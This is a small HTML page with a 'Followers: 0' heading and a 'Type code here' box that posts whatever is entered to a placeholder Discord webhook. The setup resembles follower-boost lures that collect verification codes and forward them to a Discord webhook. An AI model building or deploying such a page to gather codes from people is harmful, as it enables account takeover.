<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Code Entry</title>
  <style>
    body {
      background: #1e1e1e;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box {
      background: #2c2c2c;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    input, button {
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 5px;
      border: none;
    }
    input {
      width: 200px;
    }
    button {
      background: #3273dc;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background: #265aab;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2 id="followers">Followers: 0</h2>
    <input id="codeBox" type="text" placeholder="Type code here">
    <br>
    <button onclick="sendToDiscord()">Enter Code</button>
  </div>

  <script>
    // Replace with your real webhook
    const webhookUrl = "https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX";

    function sendToDiscord() {
      const code = document.getElementById("codeBox").value;
      if (!code) return;

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "Someone entered code: " + code })
      })
      .then(res => {
        if (res.ok) {
          alert("✅ Sent code to Discord!");
          document.getElementById("codeBox").value = "";
        } else {
          alert("❌ Error sending code.");
        }
      })
      .catch(err => alert("❌ Request failed: " + err));
    }
  </script>
</body>
</html>
